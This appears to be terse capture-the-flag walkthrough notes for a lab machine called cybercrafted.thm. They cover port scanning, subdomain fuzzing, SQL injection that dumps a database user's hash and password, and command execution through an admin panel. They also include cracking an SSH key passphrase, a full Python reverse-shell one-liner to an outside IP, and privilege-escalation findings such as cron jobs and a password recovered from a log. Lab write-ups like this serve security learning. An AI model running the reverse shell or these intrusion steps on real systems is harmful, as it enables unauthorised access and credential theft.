start with nmap

80
22


***

http port 80

http://cybercrafted.thm/

comment on index page 

`<!-- A Note to the developers: Just finished up adding other subdomains, now you can work on them! -->`

site uses php.

subdomain:

```
www                     [Status: 200, Size: 832, Words: 236, Lines: 35]
admin                   [Status: 200, Size: 937, Words: 218, Lines: 31]
store                   [Status: 403, Size: 287, Words: 20, Lines: 10]
www.admin               [Status: 200, Size: 937, Words: 218, Lines: 31]
www.store               [Status: 403, Size: 291, Words: 20, Lines: 10]


```

admin -->loginpage --> sqlinjection

***

ffuf the store subdomain.

/search.php --> sqlinjection

```
available databases [5]:                                                                                              
[*] information_schema                                     
[*] mysql                                                  
[*]performance_schema                                                    [*] sys                                                                                                               
[*] webapp   

```

from webapp database:

xXUltimateCreeperXx : 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 : diamond123456789
xxultimatecreeperxx
log in using above creds to admin.cybercrafted.thm

got panel.php , we can run commands. 

get xXUltimateCreeperXx id_rsa

id_rsa is encrypted. using ssh2john cracked id_rsa password.

`creepin2006`


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.9.112",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

***

privs 


cronjob :

 *     1 * *   cybercrafted tar -zcf /opt/minecraft/WorldBackup/world.tgz /opt/minecraft/cybercrafte
d/world/*


backup file /etc/apt/sources.list.curtin.old

/var/www/tld/secret 

 /usr/bin/SCREEN -DmS cybercrafted /usr/bin/java -Xmx2
56m -jar craftbukkit-1.7.2-server.jar nogui                         


/usr/bin/java -Xmx256m -jar craftbukkit-1.7.2-server.
jar nogui                                                         



* *     1 * *   cybercrafted tar -zcf /opt/minecraft/WorldBackup/world.tgz /opt/minecraft/cybercrafted/world/*


/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt

found cybercrafted password : JavaEdition>Bedrock